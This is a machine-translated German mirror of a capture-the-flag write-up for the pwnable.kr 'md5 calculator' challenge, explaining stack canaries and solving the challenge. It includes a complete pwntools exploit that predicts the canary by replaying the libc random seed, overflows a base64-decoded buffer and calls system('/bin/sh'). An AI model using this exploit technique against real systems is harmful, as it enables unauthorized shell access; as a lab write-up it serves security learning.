<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë©üèæ‚Äç‚öïÔ∏è üêøÔ∏è üêπ Probleml√∂sung mit pwnable.kr 23 - md5 Rechner. Wir besch√§ftigen uns mit Stack Canary. C-Bibliotheken in Python verbinden üëπ üì£ üï∏Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel l√∂sen wir die 23. Aufgabe auf der Website pwnable.kr , finden heraus, was Stack Canary ist, und verbinden libc in Python. 

 Organis...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Probleml√∂sung mit pwnable.kr 23 - md5 Rechner. Wir besch√§ftigen uns mit Stack Canary. C-Bibliotheken in Python verbinden</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/467485/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="Bild"></div><br>  In diesem Artikel l√∂sen wir die 23. Aufgabe auf der Website <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pwnable.kr</a> , finden heraus, was Stack <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Canary</a> ist, und verbinden libc in Python. <br><br><div class="spoiler">  <b class="spoiler_title">Organisationsinformationen</b> <div class="spoiler_text"> Speziell f√ºr diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit entwickeln m√∂chten, werde ich √ºber die folgenden Kategorien schreiben und sprechen: <br><br><ul><li>  PWN; </li><li>  Kryptographie (Krypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Dar√ºber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchf√ºhrung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich √ºber neue Artikel, Software und andere Informationen informieren k√∂nnen, habe ich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">in Telegram</a> einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kanal</a> und eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gruppe eingerichtet, um alle Probleme</a> im Bereich ICD <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zu diskutieren</a> .  Au√üerdem werde ich Ihre pers√∂nlichen Anfragen, Fragen, Vorschl√§ge und Empfehlungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pers√∂nlich</a> pr√ºfen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">und alle beantworten</a> . <br><cut></cut><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments √ºbernimmt keine Verantwortung f√ºr Sch√§den, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die durch das Studium dieses Dokuments erworben wurden. <br></div></div><br><h2>  Kanarienvogel stapeln </h2><br>  Kanarienv√∂gel sind bekannte Werte, die zwischen den Puffer- und Steuerdaten auf dem Stapel platziert werden, um Puffer√ºberl√§ufe zu √ºberwachen.  Nach einem Puffer√ºberlauf sind die ersten Daten, die besch√§digt werden, normalerweise Kanarienv√∂gel.  Somit wird der Wert des Kanarienvogels √ºberpr√ºft und, wenn die √úberpr√ºfung fehlschl√§gt, ein Puffer√ºberlauf signalisiert.  Es gibt drei Arten von Kanarienv√∂geln: <br><br><ol><li>  Terminator.  Kanarienv√∂gel bestehen aus Nullterminatoren, CR, LF und -1.  Daher muss der Angreifer vor dem Schreiben der Absenderadresse ein Nullzeichen schreiben, um eine √Ñnderung des Kanarienvogels zu vermeiden.  Dies verhindert Angriffe mit strcpy () und anderen Methoden, die beim Kopieren eines Nullzeichens zur√ºckgegeben werden, w√§hrend das ber√ºchtigte Ergebnis der Ruhm des Kanarienvogels ist. </li><li>  Zuf√§llig  Zuf√§llig generiert.  Normalerweise wird w√§hrend der Programminitialisierung ein zuf√§lliger Kanarienvogel generiert und in einer globalen Variablen gespeichert.  Diese Variable wird normalerweise durch nicht zugeordnete Seiten erg√§nzt. Wenn Sie also versuchen, sie mit Tricks zu lesen, bei denen Fehler zum Lesen aus dem RAM verwendet werden, wird das Programm durch einen Segmentierungsfehler beendet. </li><li>  Zuf√§lliges XOR.  Zuf√§llige Kanarienv√∂gel, die sich mit Kontrolldaten streiten.  Sobald die Kanarien- oder Kontrolldaten verstopft sind, ist der Wert des Kanarienvogels falsch.  Sie haben die gleichen Schwachstellen wie zuf√§llige Kanarienv√∂gel, au√üer dass die Methode ‚ÄûVom Stapel lesen‚Äú zum Abrufen von Kanarienv√∂geln etwas komplizierter ist.  Der Angreifer muss die Kanarienvogel-, Algorithmus- und Kontrolldaten empfangen, um den urspr√ºnglichen Kanarienvogel zu regenerieren, der zum F√§lschen des Schutzes erforderlich ist. </li></ol><br><h2>  L√∂sung des md5-Rechnerjobs </h2><br>  Wir setzen den zweiten Abschnitt fort.  Ich werde gleich sagen, dass es schwieriger ist als das erste und wir nicht mit dem Quellcode der Anwendungen versorgt werden.  Vergessen Sie nicht die Diskussion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> .  Fangen wir an. <br><br>  Klicken Sie auf das Symbol mit dem Signatur-MD5-Rechner.  Wir erhalten die Adresse und den Anschluss f√ºr die Verbindung sowie das Programm selbst. <br><br><img src="https://habrastorage.org/webt/5b/v-/du/5bv-duuvacvvvbfn0r0cubjr_hs.png" alt="Bild"><br><br>  Laden Sie alles herunter, was sie uns geben, √ºberpr√ºfen Sie die Bin√§rdatei. <br><br><img src="https://habrastorage.org/webt/ci/vq/-l/civq-lw135n5ivvsynva66tugg0.png" alt="Bild"><br><br>  Dies ist ein 32-Bit-Elf mit installiertem kanarischen und nicht ausf√ºhrbaren Stapel.  Wir dekompilieren in IDA Pro. <br><br><img src="https://habrastorage.org/webt/kh/pb/sh/khpbshiztyc2cdt1gr9vuh9h0m8.png" alt="Bild"><br><br>  Das Programm verf√ºgt √ºber eine integrierte Captcha-Pr√ºfung.  Wir sehen zwei Funktionen, die interessante Funktionen sind: my_hash () und process_hash ().  Beginnen wir mit dem ersten. <br><br><img src="https://habrastorage.org/webt/od/4v/tv/od4vtvf9vg_aqdqgnmzhxy2vusy.png" alt="Bild"><br><br>  Definieren wir die Variablentypen neu und erleichtern das Parsen des Codes: <br><br><img src="https://habrastorage.org/webt/1z/ak/06/1zak06xcqqrshyerpaq2lyttep0.png" alt="Bild"><br><br>  Somit gibt die Funktion eine Zufallszahl zur√ºck.  Gleichzeitig sind v3 die Daten an der Adresse EBP-0xC.  Schauen wir uns eine andere Funktion an. <br><br><img src="https://habrastorage.org/webt/pn/f8/by/pnf8by2wbojy7iqfzg7ysom29fc.png" alt="Bild"><br><br>  Hier erh√§lt die Variable v4 den Wert an der Adresse EBP-0xC und streitet sich dann beim Verlassen der Funktion mit diesem Wert.  Als n√§chstes werden der v3-Variablen 512 Bytes zugewiesen, die Tastatureingabe wird in die Variable g_buf eingelesen.  Danach wird der String von g_buf in Base64 dekodiert und in v3 geschrieben.  Aus v3 wird md5 Hash berechnet.  Somit sind die Eingabe in g_buf und das Kopieren in v3 nicht beschr√§nkt, daher gibt es einen Puffer√ºberlauf!  Werfen wir einen Blick auf den Stapel. <br><br><img src="https://habrastorage.org/webt/nq/kt/7v/nqkt7vssrsxc-nigoxbhsgo-zy0.png" alt="Bild"><br><br>  Die Variable v3 ist der Stapelkanarienvogel, der sich hinter dem Puffer befindet.  Das Programm ruft auch die Funktion von Systemen auf.  Nun, wir erstellen eine Vorlage f√ºr einen Exploit. <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * p = remote(<span class="hljs-string"><span class="hljs-string">'127.0.0.1'</span></span>, <span class="hljs-number"><span class="hljs-number">9002</span></span>) p.recvuntil(<span class="hljs-string"><span class="hljs-string">'captcha : '</span></span>) captcha = int(p.recv()) p.sendline(str(captcha)) p.interactive()</code> </pre> <br>  Schauen wir uns zun√§chst die Nutzlast an.  Wir m√ºssen die Systemfunktion mit dem Parameter "/ bin / sh" aufrufen.  Da der Stack jedoch nicht ausf√ºhrbar ist, rufen wir die Systemfunktion auf und √ºbergeben die Steuerung an ihre Adresse im Programm und als Parameter die Adresse an die Zeile ‚Äû/ bin / sh‚Äú, die wir in g_buf schreiben. <br><br>  Also (siehe Stapel): Sie m√ºssen 512 Bytes M√ºll schreiben, dann 4 Bytes des kanarischen Wertes, dann weitere 12 Bytes M√ºll.  F√ºr ret m√ºssen wir nun die Adresse der Systemfunktion (4 Bytes), die Adresse der Zeichenfolge "/ bin / sh" (4 Bytes) und die Zeichenfolge "/ bin / sh" selbst angeben. <br><br>  Suchen Sie nun die Unbekannten: die Systemaufrufadresse. <br><br><img src="https://habrastorage.org/webt/de/n0/7y/den07ya0t-cdxbpbg5lsu7kefdo.png" alt="Bild"><br><br>  Dies ist 0x8049187.  Und die Adresse der Zeichenfolge lautet "bin / sh".  Dazu m√ºssen wir die Anzahl der Bytes zur g_buf-Adresse in die Zeile ‚Äû/ bin / sh‚Äú einf√ºgen und dabei die base64-Codierung ber√ºcksichtigen - dies ist 4/3 des urspr√ºnglichen Werts. <br><br><img src="https://habrastorage.org/webt/bq/qg/qz/bqqgqzug4px0uhx4nj6dhlmlyre.png" alt="Bild"><br><br>  Das hei√üt, die Adresse der Zeile: 0x804b0e0 + (512 + 4 + 12 + 4 + 4 + 1) * 4/3 = 0x804b3ac.  Machen Sie die Nutzlast. <br><br><pre> <code class="python hljs">payload = <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">512</span></span> payload += p32(canary) payload += <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">12</span></span> payload += p32(<span class="hljs-number"><span class="hljs-number">0x8049187</span></span>) payload += p32(<span class="hljs-number"><span class="hljs-number">0x804b3ac</span></span>) payload = b64e(payload) payload += <span class="hljs-string"><span class="hljs-string">"/bin/sh\x00"</span></span></code> </pre> <br>  Es bleibt der Kanarienvogel zu finden.  Wie wir herausgefunden haben, summiert es sich mit zuf√§lligen Werten in der Funktion my_hash (), was uns einen Kanarienvogel gibt.  Und srand (Zeit (0)) wird als Startwert f√ºr die Rand-Funktion verwendet.  Das hei√üt, wenn wir den Vorgang in unserem Exploit wiederholen und dann den generierten Wert vom gesendeten Cookie abziehen, finden wir den Kanarienvogel.  Rufen Sie rand () von libc in Python auf. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time libc=CDLL(<span class="hljs-string"><span class="hljs-string">'libc.so.6'</span></span>) t = int(time.time()) libc.srand(t) n = [libc.rand() <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">8</span></span>)] canary = captcha - n[<span class="hljs-number"><span class="hljs-number">1</span></span>] - n[<span class="hljs-number"><span class="hljs-number">5</span></span>] - n[<span class="hljs-number"><span class="hljs-number">2</span></span>] + n[<span class="hljs-number"><span class="hljs-number">3</span></span>] - n[<span class="hljs-number"><span class="hljs-number">7</span></span>] - n[<span class="hljs-number"><span class="hljs-number">4</span></span>] + n[<span class="hljs-number"><span class="hljs-number">6</span></span>] canary &amp;= <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br>  Das ist alles.  Der vollst√§ndige Code sieht so aus. <br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time libc=CDLL(<span class="hljs-string"><span class="hljs-string">'libc.so.6'</span></span>) t = int(time.time()) libc.srand(t) n = [libc.rand() <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">8</span></span>)] p = remote(<span class="hljs-string"><span class="hljs-string">'127.0.0.1'</span></span>, <span class="hljs-number"><span class="hljs-number">9002</span></span>) p.recvuntil(<span class="hljs-string"><span class="hljs-string">'captcha : '</span></span>) captcha = int(p.recv()) p.sendline(str(captcha)) canary = captcha - n[<span class="hljs-number"><span class="hljs-number">1</span></span>] - n[<span class="hljs-number"><span class="hljs-number">5</span></span>] - n[<span class="hljs-number"><span class="hljs-number">2</span></span>] + n[<span class="hljs-number"><span class="hljs-number">3</span></span>] - n[<span class="hljs-number"><span class="hljs-number">7</span></span>] - n[<span class="hljs-number"><span class="hljs-number">4</span></span>] + n[<span class="hljs-number"><span class="hljs-number">6</span></span>] canary &amp;= <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> payload = <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">512</span></span> payload += p32(canary) payload += <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">12</span></span> payload += p32(<span class="hljs-number"><span class="hljs-number">0x8049187</span></span>) payload += p32(<span class="hljs-number"><span class="hljs-number">0x804b3ac</span></span>) payload = b64e(payload) payload += <span class="hljs-string"><span class="hljs-string">"/bin/sh\x00"</span></span> p.sendline(payload) p.interactive()</code> </pre> <br>  Ich habe es mehrmals ausgef√ºhrt und es hat nicht funktioniert. Dann wurde mir klar, dass das Ergebnis von rand () aufgrund der Geschwindigkeit des Internets und des Zeitunterschieds nicht √ºbereinstimmt.  Auf dem Server gestartet. <br><br><img src="https://habrastorage.org/webt/mr/9q/im/mr9qimobt_5qk_uf9rbiuszw3cc.png" alt="Bild"><br><br>  Wir bekommen die gew√ºnschte Flagge.  Sie k√∂nnen sich uns <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">per Telegramm anschlie√üen</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de467485/">https://habr.com/ru/post/de467485/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de467471/index.html">Soul Mikrotik gegen seelenloses ILV und den gleichen Anbieter</a></li>
<li><a href="../de467473/index.html">Und mehr √ºber Sorten</a></li>
<li><a href="../de467475/index.html">Geben Sie Thread.Abort () an .NET Core zur√ºck. Anwendungsbereitstellung mit der Version von CoreCLR und CoreFX</a></li>
<li><a href="../de467477/index.html">Kubernetes 1.16: Highlights √úbersicht</a></li>
<li><a href="../de467479/index.html">Kir Shatrov: Shopify hat mit Rails angefangen und hier lieben sie diesen Rahmen aufrichtig.</a></li>
<li><a href="../de467487/index.html">√úber die Zukunft von Blockchain- und Kryptow√§hrungszahlungen</a></li>
<li><a href="../de467489/index.html">Sie sind seltsame statische Variablen in PHP</a></li>
<li><a href="../de467493/index.html">So werden Sie f√ºr einen potenziellen Angreifer im Internet weniger zug√§nglich. Pers√∂nliche Erfahrungen und Beobachtungen</a></li>
<li><a href="../de467495/index.html">Die Kosten f√ºr die Weiterleitung</a></li>
<li><a href="../de467497/index.html">Diebe verwenden Deepfakes, um Unternehmen dazu zu bringen, Geld an sich selbst zu senden</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>